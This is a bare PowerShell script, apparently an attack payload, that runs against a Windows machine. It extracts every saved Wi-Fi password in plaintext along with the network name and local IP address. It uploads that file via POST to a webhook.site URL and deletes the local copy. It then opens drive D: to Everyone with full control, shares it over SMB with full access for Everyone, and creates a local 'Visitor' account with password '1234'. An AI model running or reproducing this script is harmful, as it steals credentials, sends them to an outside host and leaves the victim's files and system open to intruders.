cd $env:temp
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > Wi-Fi-PASS
(get-netconnectionProfile).Name >> Wi-Fi-PASS
Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress >> Wi-Fi-PASS
Invoke-WebRequest -Uri https://webhook.site/5a81bbad-90a5-40db-a015-ffb88c41bf74 -Method POST -InFile Wi-Fi-PASS
Remove-Item *Wi-*

$Acl = Get-Acl "D:\"
$Ar = New-Object System.Security.AccessControl.FileSystemAccessRule('Everyone', 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow')
$Acl.SetAccessRule($Ar)
Set-Acl 'D:\' $Acl

Remove-SmbShare -Name 'D' -Force
New-SmbShare -Path D:\\ -Name 'D' -FullAccess Everyone

Remove-LocalUser 'Visitor'
$secureString = ConvertTo-SecureString "1234" -AsPlainText -Force
New-LocalUser 'Visitor' -Password $secureString
Add-LocalGroupMember -Group 'Guests' -Member 'Visitor'
